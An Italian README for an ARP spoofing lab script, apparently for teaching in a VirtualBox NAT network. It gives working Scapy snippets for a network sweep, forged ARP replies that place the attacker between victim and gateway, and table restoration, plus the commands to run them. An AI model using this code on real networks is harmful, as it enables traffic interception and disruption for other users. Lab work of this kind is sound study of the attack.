# 🧪 Script `arptotale.py`
Questo script Python esegue un laboratorio ARP completo in ambiente virtuale NAT. Include sweep iniziale, spoofing ARP bidirezionale e ripristino automatico delle tabelle ARP alla pressione di `Ctrl+C`.

🧠 Dati finali per lo spoofing
Nodo	     IP	         MAC	            Interfaccia
Attaccante	10.0.2.16	00:11:22:33:44:55	     eth0
Vittima	    10.0.2.15	08:00:27:55:44:07	    enp0s3
Gateway	    10.0.2.2	52:54:00:12:35:02	    enp0s3

🔧 Modifica arp_spoof_lab.py
Nel tuo script, imposta:

victim_ip = "10.0.2.15"
victim_mac = "08:00:27:55:44:07"
router_ip = "10.0.2.2"
router_mac = "52:54:00:12:35:02"
attacker_mac = "00:11:22:33:44:55"

#Assicurati che l’interfaccia usata sia eth0.

🔥 Esecuzione dell’attacco
Sulla VM attaccante:


cd ~/arp_lab/scripts/
sudo python3 arp_spoof_lab.py


🧪 Verifica sulla VM vittima

ping 8.8.8.8

#Se il ping fallisce durante lo spoofing, l’attacco è riuscito.

🛡️ Ripristino
Sulla VM attaccante:

sudo sysctl -w net.ipv4.ip_forward=0

Sulla VM vittima:

sudo ip neigh flush all


## ⚙️ Funzionalità principali

### 1. ARP Sweep

#Effettua una scansione della rete (`10.0.2.0/24`) per identificare host attivi e i relativi MAC address.

arp = ARP(pdst=network_range)
ether = Ether(dst="ff:ff:ff:ff:ff:ff")
packet = ether / arp
result = srp(packet, timeout=2, iface=interface, verbose=False)[0]
------------------

### 2. ARP Spoofing
#Invia pacchetti ARP falsificati per impersonare il router verso la vittima e viceversa.

#La vittima crede che l'attaccante sia il router

#Il router NAT crede che l'attaccante sia la vittima
--------------------
pkt1 = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=router_ip, hwsrc=attacker_mac)
pkt2 = ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=victim_ip, hwsrc=attacker_mac)
send(pkt1)
send(pkt2)
---------

### 3. Ripristino ARP
#Alla pressione di Ctrl+C, lo script invia pacchetti corretti per ripristinare le tabelle ARP originali.

pkt1 = ARP(op=2, pdst=router_ip, hwdst=router_mac, psrc=victim_ip, hwsrc=victim_mac)
pkt2 = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=router_ip, hwsrc=router_mac)
send(pkt1, count=3)
send(pkt2, count=3)

---
📁 Log automatico
Tutte le operazioni vengono registrate nel file:


🛡️ Sicurezza
Funziona solo su rete NAT virtuale (VirtualBox)

Nessun impatto su router reale o rete fisica

Ripristino automatico garantito


▶️ Esecuzione

Da terminale sulla VM attaccante:

cd ~/arp_lab/scripts/
sudo python3 arptotale.py

✍️ Autore
Script scritto per ambienti CLI e laboratori di simulazione ARP. Ottimizzato per Debian minimal, VirtualBox NAT Network e logging automatico.


---
